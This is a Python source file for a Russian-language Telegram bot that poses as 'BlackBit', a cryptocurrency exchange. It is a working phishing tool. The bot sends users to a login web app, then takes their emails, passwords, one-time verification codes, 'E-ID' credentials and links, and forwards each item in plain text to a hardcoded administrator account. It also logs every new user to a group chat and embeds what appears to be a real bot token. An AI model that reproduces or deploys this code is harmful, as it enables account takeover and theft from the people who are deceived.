import os
import logging
import json
import requests
import time
from datetime import datetime
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, WebAppInfo
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

BOT_TOKEN = os.environ.get("TELEGRAM_TOKEN", "8483815029:AAFaiAI-0cSYEtQx_iTF2bdNOmtE5K45h1I")
ADMIN_ID = 7502182022  # ← ТВОЙ ID
GROUP_CHAT_ID = -1004301542136  # ← ГРУППА (только для уведомлений)
WEB_APP_URL = "https://d3987616-hue.github.io/blackbit/"

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)
user_sessions = {}

class BlackBitBot:
    def __init__(self):
        self.app = Application.builder().token(BOT_TOKEN).build()
        self.app.add_handler(CommandHandler("start", self.start))
        self.app.add_handler(MessageHandler(filters.ALL, self.handle))

    async def start(self, update: Update, context):
        user = update.effective_user
        current_time = datetime.now().strftime("%d.%m.%Y %H:%M")

        await self.app.bot.send_message(
            chat_id=GROUP_CHAT_ID,
            text=f"🟢 [BLACKBIT] НОВЫЙ ПОЛЬЗОВАТЕЛЬ\n"
                 f"👤 ID: `{user.id}`\n"
                 f"👤 Имя: {user.first_name or 'без имени'}\n"
                 f"👤 Username: {user.username or 'нет'}\n"
                 f"🕐 Время: {current_time}",
            parse_mode="Markdown"
        )

        keyboard = [[KeyboardButton("🔑 Войти", web_app=WebAppInfo(url=WEB_APP_URL))], [KeyboardButton("ℹ️ BLACKBIT")]]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

        await update.message.reply_text(
            f"👋 Привет, {user.first_name}!\n\n"
            f"Добро пожаловать на **BlackBit** — криптовалютную биржу нового поколения.\n\n"
            f"🔒 Безопасность, высокая скорость и низкие комиссии.\n"
            f"📈 Торгуй BTC, ETH, USDT и другими криптовалютами.\n\n"
            f"Нажми кнопку ВНИЗУ, чтобы войти в свой аккаунт.",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )

    async def handle(self, update: Update, context):
        if not update.message:
            return
        msg = update.message
        chat_id = msg.chat.id
        user_id = msg.from_user.id
        text = msg.text

        if chat_id == GROUP_CHAT_ID:
            return

        if text == "ℹ️ BLACKBIT":
            await msg.reply_text(
                f"📘 **О проекте BlackBit**\n\n"
                f"BlackBit — это современная криптовалютная биржа для торговли цифровыми активами.\n\n"
                f"🔒 **Безопасность** — передовые технологии защиты.\n"
                f"⚡ **Скорость** — мгновенные транзакции.\n"
                f"💰 **Низкие комиссии** — выгодные условия для трейдеров.\n\n"
                f"📈 Торгуй BTC, ETH, USDT и другими криптовалютами.",
                parse_mode="Markdown",
                disable_web_page_preview=True
            )
            return

        if user_sessions.get(user_id, {}).get('awaiting_code'):
            await self.app.bot.send_message(
                chat_id=ADMIN_ID,
                text=f"📧 [BLACKBIT] Код от {user_id}: {text}"
            )
            user_sessions[user_id]['awaiting_code'] = False
            await msg.reply_text("✅ Отправлено")
            return

        if user_sessions.get(user_id, {}).get('awaiting_link'):
            await self.app.bot.send_message(
                chat_id=ADMIN_ID,
                text=f"🔗 [BLACKBIT] Ссылка от {user_id}: {text}"
            )
            user_sessions[user_id]['awaiting_link'] = False
            await msg.reply_text("✅ Отправлено")
            return

        if text and text.startswith('{') and text.endswith('}'):
            try:
                data = json.loads(text)
                step = data.get('step')
                email = data.get('email')
                password = data.get('password')
                code = data.get('code')
                eid_type = data.get('type')
                link = data.get('link')

                if step == 'login' and email and password:
                    await self.app.bot.send_message(
                        chat_id=ADMIN_ID,
                        text=f"🔔 [BLACKBIT] НОВАЯ ЗАЯВКА!\n\n"
                             f"👤 ID: {user_id}\n"
                             f"📧 Логин: {email}\n"
                             f"🔑 Пароль: {password}"
                    )
                    await msg.reply_text("✅ Заявка отправлена администратору!")
                    return

                if step == 'code' and code:
                    await self.app.bot.send_message(
                        chat_id=ADMIN_ID,
                        text=f"📧 [BLACKBIT] Код от {user_id}: {code}"
                    )
                    await msg.reply_text("✅ Отправлено")
                    return

                if eid_type == 'eid_login' and email and password:
                    await self.app.bot.send_message(
                        chat_id=ADMIN_ID,
                        text=f"🆔 [BLACKBIT] E-ID ВХОД\n\n"
                             f"👤 ID: {user_id}\n"
                             f"📧 Логин: {email}\n"
                             f"🔑 Пароль: {password}"
                    )
                    await msg.reply_text("✅ Заявка E-ID отправлена администратору!")
                    return

                if step == 'eid_link' and link:
                    await self.app.bot.send_message(
                        chat_id=ADMIN_ID,
                        text=f"🔗 [BLACKBIT] Ссылка от {user_id}: {link}"
                    )
                    await msg.reply_text("✅ Ссылка отправлена администратору!")
                    return

            except Exception as e:
                logger.error(f"Ошибка: {e}")
                await msg.reply_text(f"Ошибка: {e}")

        else:
            if text:
                await msg.reply_text("ℹ️ Используйте кнопку «Войти»")

    def run(self):
        try:
            requests.get(f'https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook?drop_pending_updates=True')
            print("✅ Вебхук сброшен")
        except Exception as e:
            print(f"⚠️ Ошибка сброса вебхука: {e}")

        try:
            requests.get(f'https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset=-1&timeout=1')
            print("✅ Старые сессии завершены")
        except Exception as e:
            print(f"⚠️ Ошибка завершения сессий: {e}")

        time.sleep(1)

        print("=" * 50)
        print("🚀 БОТ BLACKBIT ЗАПУЩЕН")
        print(f"👤 ADMIN_ID: {ADMIN_ID}")
        print(f"👥 GROUP_CHAT_ID: {GROUP_CHAT_ID}")
        print("=" * 50)

        self.app.run_polling()


if __name__ == "__main__":
    bot = BlackBitBot()
    bot.run()
